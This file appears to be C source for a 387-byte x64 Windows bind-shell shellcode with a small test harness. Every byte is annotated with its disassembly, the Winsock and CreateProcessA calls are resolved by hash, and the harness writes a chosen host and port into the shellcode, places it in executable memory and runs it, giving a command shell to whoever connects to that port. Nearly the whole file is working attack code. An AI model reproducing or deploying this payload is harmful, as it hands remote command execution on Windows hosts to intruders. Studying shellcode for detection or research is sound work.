
#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

//
// 387 bytes bind shell for windows 64 using ipv4
//
// cl bind_overlap64_test.cpp
//

/* Copyright (c) 2014 Kevin Devine
/* Size = 387 bytes */

char bind_overlap64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                                 */
  /* 0001 */  "\x56"                          /*  push rsi                                 */
  /* 0002 */  "\x57"                          /*  push rdi                                 */
  /* 0003 */  "\x55"                          /*  push rbp                                 */
  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
  /* 000A */  "\x41\x57"                      /*  push r15                                 */
  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
  /* 0013 */  "\x48\x83\xEC\x28"              /*  sub rsp, 28h                             */
  /* 0017 */  "\xF9"                          /*  stc                                      */
  /* 0018 */  "\xEB\x70"                      /*  jmp 0000008Ah                            */
  /* 001A */  "\x5E"                          /*  pop rsi                                  */
  /* 001B */  "\x48\x8D\x6E\x30"              /*  lea rbp, qword ptr [rsi+30h]             */
  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0021 */  "\x99"                          /*  cdq                                      */
  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
  /* 0024 */  "\x2B\xE2"                      /*  sub esp, edx                             */
  /* 0026 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
  /* 0028 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
  /* 002B */  "\xF3\xAA"                      /*  rep stosb                                */
  /* 002D */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
  /* 0032 */  "\xF7\xD0"                      /*  not eax                                  */
  /* 0034 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
  /* 0039 */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
  /* 003C */  "\x48\xAB"                      /*  stosq                                    */
  /* 003E */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
  /* 0041 */  "\x48\xAD"                      /*  lodsq                                    */
  /* 0043 */  "\x48\xF7\xD0"                  /*  not rax                                  */
  /* 0046 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0048 */  "\x48\xAF"                      /*  scasq                                    */
  /* 004A */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
  /* 004D */  "\x6A\x68"                      /*  push 00000068h                           */
  /* 004F */  "\x58"                          /*  pop rax                                  */
  /* 0050 */  "\xAB"                          /*  stosd                                    */
  /* 0051 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
  /* 0055 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
  /* 005A */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
  /* 005E */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0061 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0064 */  "\xB2\x01"                      /*  mov dl, 01h                              */
  /* 0066 */  "\xB1\x02"                      /*  mov cl, 02h                              */
  /* 0068 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 006A */  "\x93"                          /*  xchg eax, ebx                            */
  /* 006B */  "\x6A\x10"                      /*  push 00000010h                           */
  /* 006D */  "\x41\x58"                      /*  pop r8                                   */
  /* 006F */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
  /* 0072 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0074 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0076 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0079 */  "\x92"                          /*  xchg eax, edx                            */
  /* 007A */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 007C */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 007E */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0081 */  "\x92"                          /*  xchg eax, edx                            */
  /* 0082 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0084 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0086 */  "\x4C\x8B\xF0"                  /*  mov r14, rax                             */
  /* 0089 */  "\xF8"                          /*  clc                                      */
  /* 008A */  "\x72\x4A"                      /*  jc 000000D6h                             */
  /* 008C */  "\x48\xAB"                      /*  stosq                                    */
  /* 008E */  "\x48\xAB"                      /*  stosq                                    */
  /* 0090 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0092 */  "\x48\xAF"                      /*  scasq                                    */
  /* 0094 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
  /* 0099 */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
  /* 009D */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 00A0 */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 00A3 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
  /* 00A6 */  "\x33\xC9"                      /*  xor ecx, ecx                             */
  /* 00A8 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AA */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
  /* 00AD */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B0 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B2 */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00B5 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00B7 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
  /* 00BB */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00BD */  "\x49\x8B\xCE"                  /*  mov rcx, r14                             */
  /* 00C0 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C2 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 00C4 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00C6 */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
  /* 00C9 */  "\x41\x5F"                      /*  pop r15                                  */
  /* 00CB */  "\x41\x5E"                      /*  pop r14                                  */
  /* 00CD */  "\x41\x5D"                      /*  pop r13                                  */
  /* 00CF */  "\x41\x5C"                      /*  pop r12                                  */
  /* 00D1 */  "\x5D"                          /*  pop rbp                                  */
  /* 00D2 */  "\x5F"                          /*  pop rdi                                  */
  /* 00D3 */  "\x5E"                          /*  pop rsi                                  */
  /* 00D4 */  "\x5B"                          /*  pop rbx                                  */
  /* 00D5 */  "\xC3"                          /*  ret                                      */
  /* 00D6 */  "\xE8\x3F\xFF\xFF\xFF"          /*  call 0000001Ah                           */
  
  /* 00DB */  "\x00\x00\x00\x00"              /*  sockaddr_in with sin_zero field missing  */
  /* 00DF */  "\x00\x00\x00\x00"
  
  /* 00E3 */  "\xB2\xA5\xC1\x87"              /*  WSASocketA                               */
  /* 00E7 */  "\x1C\xB1\x14\xCB"              /*  bind                                     */
  /* 00EB */  "\xEE\xAD\xFD\x8A"              /*  listen                                   */
  /* 00EF */  "\x3C\x2C\x96\x9A"              /*  accept                                   */
  /* 00F3 */  "\xFE\xDF\x72\x17"              /*  CreateProcessA                           */
  /* 00F7 */  "\x4B\xDA\x38\x53"              /*  WaitForSingleObject                      */
  /* 00FB */  "\x35\xC9\x1E\x7F"              /*  CloseHandle                              */
  /* 00FF */  "\x35\xC9\x1E\x7F"              /*  CloseHandle                              */
  /* 0103 */  "\x6E\xED\xCD\xA2"              /*  closesocket                              */
  /* 0107 */  "\x6E\xED\xCD\xA2"              /*  closesocket                              */
  
  /* 010B */  "\xAD"                          /*  lodsd                                    */
  /* 010C */  "\x50"                          /*  push rax                                 */
  /* 010D */  "\x51"                          /*  push rcx                                 */
  /* 010E */  "\x52"                          /*  push rdx                                 */
  /* 010F */  "\x53"                          /*  push rbx                                 */
  /* 0110 */  "\x55"                          /*  push rbp                                 */
  /* 0111 */  "\x56"                          /*  push rsi                                 */
  /* 0112 */  "\x57"                          /*  push rdi                                 */
  /* 0113 */  "\x6A\x60"                      /*  push 00000060h                           */
  /* 0115 */  "\x5E"                          /*  pop rsi                                  */
  /* 0116 */  "\x65\x48\xAD"                  /*  lodsq                                    */
  /* 0119 */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
  /* 011D */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
  /* 0121 */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
  /* 0125 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
  /* 0128 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
  /* 012B */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
  /* 012E */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
  /* 0132 */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
  /* 0137 */  "\xAD"                          /*  lodsd                                    */
  /* 0138 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 0139 */  "\x67\xE3\xE5"                  /*  jecxz 00000121h                          */
  /* 013C */  "\xAD"                          /*  lodsd                                    */
  /* 013D */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
  /* 0141 */  "\xAD"                          /*  lodsd                                    */
  /* 0142 */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
  /* 0146 */  "\xAD"                          /*  lodsd                                    */
  /* 0147 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
  /* 014B */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
  /* 014F */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
  /* 0152 */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0154 */  "\x99"                          /*  cdq                                      */
  /* 0155 */  "\xAC"                          /*  lodsb                                    */
  /* 0156 */  "\x03\xD0"                      /*  add edx, eax                             */
  /* 0158 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
  /* 015B */  "\x33\xD0"                      /*  xor edx, eax                             */
  /* 015D */  "\xFF\xC8"                      /*  dec eax                                  */
  /* 015F */  "\x79\xF4"                      /*  jns 00000155h                            */
  /* 0161 */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
  /* 0166 */  "\xE0\xE3"                      /*  loopne 0000014Bh                         */
  /* 0168 */  "\x75\xB7"                      /*  jne 00000121h                            */
  /* 016A */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
  /* 016E */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
  /* 0172 */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
  /* 0175 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
  /* 017A */  "\x5F"                          /*  pop rdi                                  */
  /* 017B */  "\x5E"                          /*  pop rsi                                  */
  /* 017C */  "\x5D"                          /*  pop rbp                                  */
  /* 017D */  "\x5B"                          /*  pop rbx                                  */
  /* 017E */  "\x5A"                          /*  pop rdx                                  */
  /* 017F */  "\x59"                          /*  pop rcx                                  */
  /* 0180 */  "\x58"                          /*  pop rax                                  */
  /* 0181 */  "\xFF\xE0"                      /*  jmp rax                                  */
};

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 3) {
    printf ("\nUsage: bind_overlap64_test <host> <port>");
    printf ("\nExample: bind_overlap64_test localhost 80\n");
    return 0;
  }
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  sockaddr_in *p = (sockaddr_in*)&bind_overlap64[0xdb];
  in_addr_t ip = ~resolve (argv[1]);
  
  memcpy (&p->sin_addr, &ip, sizeof (ip));
  p->sin_port   = ~htons (atoi(argv[2]));
  p->sin_family = ~AF_INET;
  
  void *exec = VirtualAlloc(0, strlen (bind_overlap64), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, bind_overlap64, strlen (bind_overlap64));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

